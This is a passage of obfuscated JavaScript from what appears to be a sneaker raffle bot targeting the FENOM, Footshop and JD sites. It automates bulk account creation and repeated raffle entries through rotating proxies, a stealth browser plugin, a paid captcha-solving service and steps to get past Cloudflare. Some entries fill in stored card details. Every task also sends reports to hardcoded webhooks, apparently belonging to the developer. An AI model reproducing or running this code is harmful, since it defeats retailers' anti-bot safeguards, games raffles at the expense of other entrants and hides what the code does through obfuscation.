                                await _0x19092a['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x329036 = 'no', console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Account\x20' + _0x5caa2a[_0x1fcb72]['Email'] + '\x20Generated')), _0x4d1c4a['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x5caa2a[_0x1fcb72]['Email'] + ',' + _0x5caa2a[_0x1fcb72]['Password']);
                                try {
                                    _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x15f687['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16a920(_0x244950, _0x15f687['succesDEVMSG']);
                            } catch (_0x374a51) {
                                throw new Error('Account\x20generation\x20failed:\x20' + _0x374a51);
                            }
                        } catch (_0x174ce3) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20' + _0x174ce3)), _0x10f3e1 = '' + _0x174ce3;
                            var _0xccfe46 = await _0x485032(_0x5caa2a[_0x1fcb72], _0x13a316, 'acc', !![], _0x10f3e1);
                            _0x15f687['errorDEV'] = { 'embeds': [_0xccfe46] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x15f687['errorDEV']), await _0x16a920(_0x233d0f, _0x15f687['errorDEV']), _0x329036 = 'yes';
                        } finally {
                            _0x2358ac['close']();
                            if (_0x329036 == 'yes' && _0x54f253 != 0x5 && _0x10f3e1 != 'Size\x20Not\x20Found') {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Retrying')), _0x1fcb72 = _0x1fcb72 - 0x1, _0x54f253 = _0x54f253 + 0x1;
                                continue;
                            }
                            _0x329036 == 'yes' && _0x54f253 >= 0x5 && (_0x1ac5d5(_0x5caa2a[_0x1fcb72], _0x13a316), _0x329036 = 'no', _0x54f253 = 0x0), console['log'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x424a66(_0x2dc162, _0x5bc56c, _0x4c9d4a) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1882f1 = 0x0; _0x1882f1 < _0x5bc56c['length']; _0x1882f1++) {
                        if (_0xe8757b != 'yes')
                            var _0xe8757b = '', _0x526b3e = 0x0;
                        var _0x2f07dc;
                        await _0x3962cc(_0x5bc56c, _0x1882f1), _0x2ad028(_0x2dc162['name'] + '\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20/\x20' + _0x5bc56c['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        const _0x56ef47 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2d4072 = Math['round'](Math['random']() * (_0x4c9d4a['length'] - 0x1)), _0x4dc79c = _0x4c9d4a[_0x2d4072]['split'](':'), _0x3e31d7;
                        try {
                            _0x3e31d7 = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dc79c[0x0] + ':' + _0x4dc79c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3e31d7 = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x4dc79c[0x0] + ':' + _0x4dc79c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2092a9 = await _0x3e31d7['newPage'](), _0x3fcdaf = await _0x2092a9['target']()['createCDPSession'](), { windowId: _0x176680 } = await _0x3fcdaf['send']('Browser.getWindowForTarget');
                            await _0x2092a9['authenticate']({
                                'username': '' + _0x4dc79c[0x2],
                                'password': '' + _0x4dc79c[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2092a9['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x38c39e(0xbb8), await _0x3fcdaf['send']('Browser.setWindowBounds', {
                                'windowId': _0x176680,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x38c39e(0x1f40);
                            try {
                                await _0x2092a9['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x38c39e(0x1388), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x2092a9['type']('input[name=\x22email\x22]', '' + _0x5bc56c[_0x1882f1]['Email']), await _0x38c39e(0x1f4), await _0x2092a9['type']('input[name=\x22password\x22]', '' + _0x5bc56c[_0x1882f1]['Password']), await _0x38c39e(0x258), await _0x2092a9['$eval']('#login-form', _0xd11aa7 => _0xd11aa7['submit']()), await _0x2092a9['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x38c39e(0x1f4), await _0x2092a9['goto']('' + _0x5bc56c[_0x1882f1]['Url']), await _0x2092a9['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5bc56c[_0x1882f1]['Size']);
                            if (_0x5bc56c[_0x1882f1]['Size'] != 'RANDOM') {
                                var _0x32d4ac = '\x20' + _0x5bc56c[_0x1882f1]['Size'] + '\x20';
                                const _0x3be601 = await _0x2092a9['$x']('//span[contains(text(),\x20' + _0x32d4ac + ')]');
                                await _0x3be601[0x0]['click']();
                            } else {
                                const _0x20e81d = await _0x2092a9['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5e60ff = Math['round'](Math['random']() * (_0x20e81d['length'] - 0x1));
                                await _0x20e81d[_0x5e60ff]['click']();
                            }
                            await _0x38c39e(0x258), await _0x2092a9['click']('#cookieChoiceDismiss'), await _0x38c39e(0x3e8), await _0x2092a9['type']('#instagram-account', '' + _0x5bc56c[_0x1882f1]['Follower']), await _0x38c39e(0x28a), await _0x2092a9['click']('#book-btn'), await _0x38c39e(0xbb8), await _0x2092a9['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe'), await _0x38c39e(0x1f4), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20' + _0x52c84d['cyan']('Solving\x20Captcha')), await _0x2092a9['solveRecaptchas'](), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x38c39e(0x7d0), await _0x2092a9['$eval']('#book-btn-for-sure', _0x3ec543 => _0x3ec543['click']()), await _0x38c39e(0x12c), await _0x2092a9['click']('#book-btn-for-sure'), await _0x38c39e(0xdac);
                            const _0x2d887b = await _0x2092a9['$eval']('.reservation-popup\x20>\x20.title', _0x354aa3 => {
                                return _0x354aa3['innerHTML'];
                            });
                            if (_0x2d887b) {
                                _0xe8757b = 'no', _0x41f993(_0x5bc56c[_0x1882f1], _0x2dc162), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xd9ddb0 = await _0x485032(_0x5bc56c[_0x1882f1], _0x2dc162, 'dev', ![]), _0x3efb8e = await _0x485032(_0x5bc56c[_0x1882f1], _0x2dc162, 'pub', ![]);
                                const _0xc6b8e = {
                                    'succesDEVMSG': { 'embeds': [_0xd9ddb0] },
                                    'succesPUBMSG': { 'embeds': [_0x3efb8e] }
                                };
                                try {
                                    _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0xc6b8e['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0xc6b8e['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x2766d4, _0xc6b8e['succesPUBMSG']);
                                } catch (_0x4a693c) {
                                    console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4a693c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3802ca) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20' + _0x3802ca)), _0x2f07dc = '' + _0x3802ca;
                            var _0x5b97f1 = await _0x485032(_0x5bc56c[_0x1882f1], _0x2dc162, 'dev', !![], _0x2f07dc), _0xd9ddb0 = await _0x485032(_0x5bc56c[_0x1882f1], _0x2dc162, 'dev', ![]), _0x3efb8e = await _0x485032(_0x5bc56c[_0x1882f1], _0x2dc162, 'pub', ![]);
                            const _0x304520 = {
                                'succesDEVMSG': { 'embeds': [_0xd9ddb0] },
                                'succesPUBMSG': { 'embeds': [_0x3efb8e] }
                            };
                            _0x304520['errorDEV'] = { 'embeds': [_0x5b97f1] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x304520['errorDEV']), await _0x16a920(_0x233d0f, _0x304520['errorDEV']), _0x3802ca != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xe8757b = 'yes');
                        } finally {
                            _0x3e31d7['close']();
                            if (_0xe8757b == 'yes' && _0x526b3e != 0x5 && _0x2f07dc != 'Size\x20Not\x20Found') {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Task\x20' + (_0x1882f1 + 0x1) + '\x20:\x20Retrying')), _0x1882f1 = _0x1882f1 - 0x1, _0x526b3e = _0x526b3e + 0x1;
                                continue;
                            }
                            _0xe8757b == 'yes' && _0x526b3e >= 0x5 && (_0x1ac5d5(_0x5bc56c[_0x1882f1], _0x2dc162), _0xe8757b = 'no', _0x526b3e = 0x0), console['log'](_0x21c871() + '\x20[' + _0x2dc162['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x20e6be, _0xb3588e, _0x42d74) {
                _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5e160d['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1d8414 = 0x0; _0x1d8414 < _0xb3588e['length']; _0x1d8414++) {
                    var _0x130b01;
                    if (_0x522dac != 'yes')
                        var _0x522dac = '', _0x3939ae = 0x0;
                    var _0x58a7e5 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x50a338
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0xb3588e[_0x1d8414]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0xb3588e[_0x1d8414]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5e160d['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xa56f6b
                            }
                        ]
                    }], _0x82a72e = await _0x485032(_0xb3588e[_0x1d8414], _0x20e6be, 'dev', ![]), _0x38c94c = await _0x485032(_0xb3588e[_0x1d8414], _0x20e6be, 'pub', ![]);
                    const _0x117bb8 = {
                        'succesDEVMSG': { 'embeds': [_0x82a72e] },
                        'succesPUBMSG': { 'embeds': [_0x38c94c] }
                    }, _0x23fcf6 = { 'embeds': _0x58a7e5 };
                    await _0x3962cc(_0xb3588e, _0x1d8414);
                    if (_0xb3588e[_0x1d8414]['Email'] == '' || _0xb3588e[_0x1d8414]['FirstName'] == '' || _0xb3588e[_0x1d8414]['LastName'] == '' || _0xb3588e[_0x1d8414]['Country'] == '' || _0xb3588e[_0x1d8414]['Size'] == '' || _0xb3588e[_0x1d8414]['Address1'] == '' || _0xb3588e[_0x1d8414]['Zip'] == '') {
                        console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xb3588e[_0x1d8414]['Email'] == '' || _0xb3588e[_0x1d8414]['FirstName'] == '' || _0xb3588e[_0x1d8414]['LastName'] == '' || _0xb3588e[_0x1d8414]['Country'] == '' || _0xb3588e[_0x1d8414]['Size'] == '' || _0xb3588e[_0x1d8414]['Address1'] == '' || _0xb3588e[_0x1d8414]['Zip'] == '' || _0xb3588e[_0x1d8414]['Phone'] == '') {
                        console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x1c9e39 = '' + _0xb3588e[_0x1d8414]['Url'];
                    if (_0x5e160d['useRandomProxy'] = ![])
                        var _0x30a079 = _0x42d74[_0x1d8414]['split'](':');
                    else
                        var _0x5ae8f5 = Math['round'](Math['random']() * (_0x42d74['length'] - 0x1)), _0x30a079 = _0x42d74[_0x5ae8f5]['split'](':');
                    const _0x20f989 = await _0x3d68d8['launch']({
                        'headless': !![],
                        'args': ['--proxy-server=' + _0x30a079[0x0] + ':' + _0x30a079[0x1]]
                    });
                    try {
                        const _0x3c03ae = await _0x20f989['newPage']();
                        await _0x3c03ae['authenticate']({
                            'username': '' + _0x30a079[0x2],
                            'password': '' + _0x30a079[0x3]
                        }), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c03ae['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3c03ae['setRequestInterception'](!![]), _0x3c03ae['on']('request', _0x297268 => {
                            _0x297268['resourceType']() === 'image' || _0x297268['resourceType']() === 'font' || _0x297268['resourceType']() === 'media' ? _0x297268['abort']() : _0x297268['continue']();
                        }), await _0x3c03ae['goto'](_0x1c9e39), await _0x38c39e(0xbb8), await _0x3c03ae['waitForSelector']('.control__JhutY'), await _0x3c03ae['click']('.control__JhutY'), await _0x38c39e(0x1f4);
                        if (_0xb3588e[_0x1d8414]['Size'] != 'RANDOM')
                            try {
                                const _0x244d40 = await _0x3c03ae['$x']('//div[contains(text(),\x20\x27' + _0xb3588e[_0x1d8414]['Size'] + '\x27)]');
                                await _0x244d40[0x0]['click']();
                            } catch {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x561c8e = await _0x3c03ae['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x55a1a3 = Math['round'](Math['random']() * (_0x561c8e['length'] - 0x1));
                            await _0x561c8e[_0x55a1a3]['click']();
                        }
                        await _0x38c39e(0x4b0);
                        const _0x5d8525 = await _0x3c03ae['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x5d8525[0x0]['click'](), await _0x3c03ae['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x3c03ae['type']('input[name=\x22email\x22]', '' + _0xb3588e[_0x1d8414]['Email']), await _0x38c39e(0x640), await _0x3c03ae['type']('input[name=\x22phone\x22]', '' + _0xb3588e[_0x1d8414]['Phone']), await _0x38c39e(0x4b0), await _0x3c03ae['click']('button.btn.continue-button__1RtsS'), await _0x38c39e(0x4b0);
                        try {
                            await _0x3c03ae['type']('input[name=\x22firstName\x22]', '' + _0xb3588e[_0x1d8414]['FirstName']), await _0x38c39e(0x258);
                        } catch {
                            const _0x2f89e2 = await _0x3c03ae['$$eval']('.invalid-feedback\x20>\x20div', _0x574647 => {
                                return _0x574647['map'](_0x2a91e5 => _0x2a91e5['innerText']);
                            });
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20' + _0x2f89e2));
                            continue;
                        }
                        await _0x3c03ae['type']('input[name=\x22lastName\x22]', '' + _0xb3588e[_0x1d8414]['LastName']), await _0x38c39e(0xc8), await _0x3c03ae['type']('input[name=\x22instagramUsername\x22]', '' + _0xb3588e[_0x1d8414]['Follower']), await _0x38c39e(0x4b0), await _0x3c03ae['click']('button.btn.continue-button__1RtsS'), await _0x38c39e(0x3e8), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x3c03ae['select']('select[name=\x22country\x22]', '' + _0xb3588e[_0x1d8414]['Country']), await _0x38c39e(0x2bc), await _0x3c03ae['type']('input[name=\x22streetName\x22]', '' + _0xb3588e[_0x1d8414]['Address1']), await _0x38c39e(0x258), await _0x3c03ae['type']('input[name=\x22houseNumber\x22]', _0xb3588e[_0x1d8414]['HouseNumber'] + '\x20' + _0xb3588e[_0x1d8414]['Address2']), await _0x38c39e(0xc8), await _0x3c03ae['type']('input[name=\x22postalCode\x22]', '' + _0xb3588e[_0x1d8414]['Zip']), await _0x38c39e(0x1f4), await _0x3c03ae['type']('input[name=\x22city\x22]', '' + _0xb3588e[_0x1d8414]['City']), await _0x38c39e(0x4b0), await _0x3c03ae['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x38c39e(0x4b0), await _0x3c03ae['click']('button.btn.continue-button__1RtsS'), await _0x38c39e(0x4b0), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x3c03ae['solveRecaptchas'](), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x38c39e(0xbb8), await _0x3c03ae['click']('button.btn.continue-button__1RtsS'), await _0x38c39e(0x1388), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x3c03ae['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3c03ae['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x38c39e(0x4b0), await _0x3c03ae['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0xb3588e[_0x1d8414]['CardNumber']), await _0x38c39e(0x320), await _0x3c03ae['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3c03ae['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0xb3588e[_0x1d8414]['ExpiryDate']), await _0x38c39e(0x4b0), await _0x3c03ae['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3c03ae['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0xb3588e[_0x1d8414]['CVV']), await _0x38c39e(0x226), await _0x3c03ae['type']('input[name=\x22holderName\x22]', '' + _0xb3588e[_0x1d8414]['NameOnCard']), await _0x38c39e(0x226), await _0x3c03ae['click']('button.adyen-checkout__button'), console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x3c03ae['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x38c39e(0xbb8);
                        } catch (_0x20a3f8) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x203DS\x20Failed')), _0x130b01 = '3DS\x20Error\x20' + _0x20a3f8;
                            var _0xb3273 = await _0x485032(_0xb3588e[_0x1d8414], _0x20e6be, 'dev', !![], _0x130b01);
                            _0x117bb8['errorDEV'] = { 'embeds': [_0xb3273] };
                            _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x117bb8['errorDEV']);
                            await _0x16a920(_0x233d0f, _0x117bb8['errorDEV']);
                            continue;
                        }
                        _0x41f993(_0xb3588e[_0x1d8414], _0x20e6be), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                            try {
                                await _0x16a920(_0x5e160d['webhook'], _0x117bb8['succesDEVMSG']);
                            } catch {
                            }
                        await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x117bb8['succesDEVMSG']), await _0x38c39e(0xc8);
                        try {
                            await _0x16a920(_0x2766d4, _0x117bb8['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x53a85e) {
                        console['log'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20' + _0x53a85e), _0x130b01 = '' + _0x53a85e;
                        var _0xb3273 = await _0x485032(_0xb3588e[_0x1d8414], _0x20e6be, 'dev', !![], _0x130b01);
                        _0x117bb8['errorDEV'] = { 'embeds': [_0xb3273] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x117bb8['errorDEV']), await _0x16a920(_0x233d0f, _0x117bb8['errorDEV']), _0x522dac = 'yes';
                    } finally {
                        _0x20f989['close']();
                        if (_0x522dac == 'yes' && _0x3939ae != 0x5) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x20e6be['name'] + ']\x20Task\x20' + (_0x1d8414 + 0x1) + '\x20:\x20Retrying')), _0x1d8414 = _0x1d8414 - 0x1, _0x3939ae = _0x3939ae + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5e160d['footshopDelay'] + '\x20ms'), await _0x38c39e(_0x5e160d['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x46e3ce, _0x906463, _0x52f695) {
                var _0xe69618 = ![], _0x31facb = ![];
                if (_0x5e160d['captchaKey'] == '' || _0x5e160d['captchaKey'] == undefined)
                    return console['log'](_0x52c84d['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5e160d['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xbb5fc0 = 0x0; _0xbb5fc0 < _0x906463['length']; _0xbb5fc0++) {
                    if (_0x51cdc4 != 'yes')
                        var _0x51cdc4 = '', _0x3a60eb = 0x0;
                    var _0xd67bfd, _0x5da876 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x906463[_0xbb5fc0]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x906463[_0xbb5fc0]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x50a338
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5e160d['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xa56f6b
                            }
                        ]
                    }];
                    const _0x309d9e = { 'embeds': _0x5da876 };
                    _0x2ad028(_0x46e3ce['name'] + '\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20/\x20' + _0x906463['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x906463, _0xbb5fc0);
                    var _0x207d86 = await _0x485032(_0x906463[_0xbb5fc0], _0x46e3ce, 'dev', ![]), _0xee0415 = await _0x485032(_0x906463[_0xbb5fc0], _0x46e3ce, 'pub', ![]);
                    const _0x1fbe46 = {
                        'succesDEVMSG': { 'embeds': [_0x207d86] },
                        'succesPUBMSG': { 'embeds': [_0xee0415] }
                    };
                    if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                        try {
                            await _0x16a920(_0x5e160d['webhook'], _0x1fbe46['succesDEVMSG']);
                        } catch {
                        }
                    await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x1fbe46['succesDEVMSG']), await _0x38c39e(0xc8);
                    try {
                        await _0x16a920(_0x2766d4, _0x1fbe46['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x906463[_0xbb5fc0]['Email'] == '' || _0x906463[_0xbb5fc0]['Url'] == '' || _0x906463[_0xbb5fc0]['FirstName'] == '' || _0x906463[_0xbb5fc0]['LastName'] == '') {
                        console['log'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5e160d['useRandomProxy'] = ![])
                        var _0x4353c5 = _0x52f695[_0xbb5fc0]['split'](':');
                    else
                        var _0x3a2ff6 = Math['round'](Math['random']() * (_0x52f695['length'] - 0x1)), _0x4353c5 = _0x52f695[_0x3a2ff6]['split'](':');
                    const _0x180d0c = await _0x3d68d8['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x4353c5[0x0] + ':' + _0x4353c5[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x4fa38a = await _0x180d0c['newPage']();
                        await _0x4fa38a['authenticate']({
                            'username': '' + _0x4353c5[0x2],
                            'password': '' + _0x4353c5[0x3]
                        }), console['log'](_0x21c871() + '\x20[' + _0x46e3ce['name'] + ']\x20Task\x20' + (_0xbb5fc0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4fa38a['setRequestInterception'](!![]), _0x4fa38a['on']('request', _0x3b0b4c => {
                            _0x3b0b4c['resourceType']() === 'image' || _0x3b0b4c['resourceType']() === 'font' || _0x3b0b4c['resourceType']() === 'media' ? _0x3b0b4c['abort']() : _0x3b0b4c['continue']();
                        }), await _0x4fa38a['goto']('' + _0x906463[_0xbb5fc0]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x4fa38a['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
